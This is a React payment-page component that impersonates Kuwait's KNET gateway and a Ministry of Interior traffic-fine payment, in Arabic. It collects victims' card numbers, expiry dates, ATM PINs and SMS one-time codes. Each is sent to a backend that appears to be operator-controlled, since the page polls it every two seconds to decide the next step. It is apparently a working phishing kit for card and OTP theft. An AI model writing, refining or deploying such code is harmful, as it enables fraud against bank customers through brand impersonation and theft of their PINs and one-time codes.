import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardPrefix, setCardPrefix] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [showPrefixes, setShowPrefixes] = useState(false);
  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    if (cardPrefix === "4") {
      setAvailablePrefixes(PREFIXES_4);
      setShowPrefixes(true);
    } else if (cardPrefix === "5") {
      setAvailablePrefixes(PREFIXES_5);
      setShowPrefixes(true);
    } else {
      setShowPrefixes(false);
    }
  }, [cardPrefix]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardPrefix + cardNumber,
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-payment-page" dir="rtl">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #f5f5f5 !important; font-family: 'Segoe UI', Arial, sans-serif; }
        .knet-payment-page { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        .knet-card { width: 100%; max-width: 480px; background: white; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .knet-header { background: #0082c3; padding: 15px; text-align: center; color: white; }
        .knet-body { padding: 25px; }
        .tasdeed-logo { height: 50px; margin-bottom: 20px; }
        .payment-info { background: #f9f9f9; padding: 15px; border-radius: 5px; margin-bottom: 25px; border: 1px solid #eee; }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
        .info-label { color: #666; font-weight: bold; }
        .info-value { color: #0082c3; font-weight: bold; }
        .form-label { font-size: 14px; font-weight: bold; color: #333; margin-bottom: 8px; display: block; }
        .knet-input { border: 1px dashed #d9534f; border-radius: 4px; height: 40px; padding: 0 12px; font-size: 16px; width: 100%; outline: none; transition: border 0.3s; text-align: center; }
        .knet-input:focus { border-style: solid; border-color: #0082c3; }
        .prefix-container { position: relative; display: flex; gap: 10px; }
        .prefix-list { position: absolute; top: 42px; left: 0; right: 0; background: white; border: 1px solid #ddd; border-radius: 4px; z-index: 100; max-height: 150px; overflow-y: auto; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .prefix-option { padding: 8px 12px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #eee; }
        .prefix-option:hover { background: #f0f7ff; color: #0082c3; }
        .knet-btn { height: 45px; border-radius: 4px; font-weight: bold; font-size: 16px; border: none; cursor: pointer; transition: opacity 0.3s; }
        .btn-submit { background: #0082c3; color: white; width: 100%; }
        .btn-cancel { background: #eee; color: #666; width: 100%; margin-top: 10px; }
        .knet-footer { margin-top: 30px; text-align: center; font-size: 12px; color: #999; }
      `}</style>

      <div className="knet-card">
        <div className="knet-header">
          <h5 className="m-0">KNET Payment Gateway</h5>
        </div>
        <div className="knet-body">
          <div className="text-center">
            <img src="https://www.kpay.com.kw/kpg/images/tasdeed_logo.png" className="tasdeed-logo" alt="Tasdeed" />
          </div>

          <div className="payment-info">
            <div className="info-row">
              <span className="info-label">المستفيد:</span>
              <span className="info-value">وزارة الداخلية</span>
            </div>
            <div className="info-row">
              <span className="info-label">المبلغ الإجمالي:</span>
              <span className="info-value">{paymentData.totalAmount} د.ك</span>
            </div>
          </div>

          {stage === "card" && (
            <form onSubmit={handleCardSubmit}>
              <div className="mb-4">
                <label className="form-label">رقم بطاقة الصراف الآلي (K-NET)</label>
                <div className="prefix-container">
                  <div style={{width: '100px', position: 'relative'}}>
                    <input 
                      type="text" 
                      className="knet-input" 
                      placeholder="Prefix"
                      value={cardPrefix}
                      onChange={e => setCardPrefix(e.target.value.replace(/\D/g, '').substring(0, 4))}
                      required
                    />
                    {showPrefixes && (
                      <div className="prefix-list">
                        {availablePrefixes.map(p => (
                          <div key={p} className="prefix-option" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
                        ))}
                      </div>
                    )}
                  </div>
                  <input 
                    type="text" 
                    className="knet-input flex-grow-1" 
                    placeholder="رقم البطاقة"
                    value={cardNumber}
                    onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 12))}
                    required
                  />
                </div>
              </div>

              <div className="row mb-4">
                <div className="col-6">
                  <label className="form-label">تاريخ الانتهاء</label>
                  <div className="d-flex gap-2">
                    <input type="text" className="knet-input" placeholder="MM" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                    <input type="text" className="knet-input" placeholder="YY" value={expiryYear} onChange={e => setExpiryYear(e.target.value.replace(/\D/g, '').substring(0, 2))} required />
                  </div>
                </div>
                <div className="col-6">
                  <label className="form-label">الرقم السري (PIN)</label>
                  <input type="password" maxLength={4} className="knet-input" placeholder="****" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} required />
                </div>
              </div>

              <button type="submit" className="knet-btn btn-submit">دفع الآن</button>
              <button type="button" className="knet-btn btn-cancel" onClick={() => setLocation("/")}>إلغاء</button>
            </form>
          )}

          {stage === "otp" && (
            <form onSubmit={handleOtpSubmit} className="text-center">
              <h5 className="mb-4" style={{color: '#0082c3'}}>تأكيد الرمز (OTP)</h5>
              <p className="small text-muted mb-4">يرجى إدخال الرمز المرسل إلى هاتفك المحمول</p>
              <input 
                type="text" 
                className="knet-input mb-4" 
                style={{letterSpacing: '8px', fontSize: '24px', height: '50px'}} 
                value={otp} 
                onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} 
                placeholder="000000" 
                required 
              />
              <button type="submit" className="knet-btn btn-submit">تأكيد الدفع</button>
            </form>
          )}

          {stage.endsWith("_pending") && (
            <div className="text-center py-5">
              <div className="spinner-border text-primary" role="status"></div>
              <p className="mt-3 font-weight-bold" style={{color: '#0082c3'}}>يرجى الانتظار، جاري المعالجة...</p>
            </div>
          )}

          {stage === "success" && (
            <div className="text-center py-4">
              <div className="mb-3" style={{fontSize: '50px'}}>✅</div>
              <h4 className="text-success font-weight-bold">تمت عملية الدفع بنجاح</h4>
              <p className="text-muted">سيتم تحديث بيانات المخالفات خلال 15 دقيقة</p>
              <button className="knet-btn btn-submit mt-4" onClick={() => setLocation("/")}>العودة للرئيسية</button>
            </div>
          )}

          {stage === "failed" && (
            <div className="text-center py-4">
              <div className="mb-3" style={{fontSize: '50px'}}>❌</div>
              <h4 className="text-danger font-weight-bold">فشلت عملية الدفع</h4>
              <p className="text-muted">{error || "يرجى التأكد من بيانات البطاقة والمحاولة مرة أخرى"}</p>
              <button className="knet-btn btn-submit mt-4" onClick={() => setStage("card")}>إعادة المحاولة</button>
            </div>
          )}
        </div>
      </div>

      <div className="knet-footer">
        جميع الحقوق محفوظة © 2026<br/>
        شركة الخدمات المصرفية الآلية المشتركة (كي نت)
      </div>
    </div>
  );
}
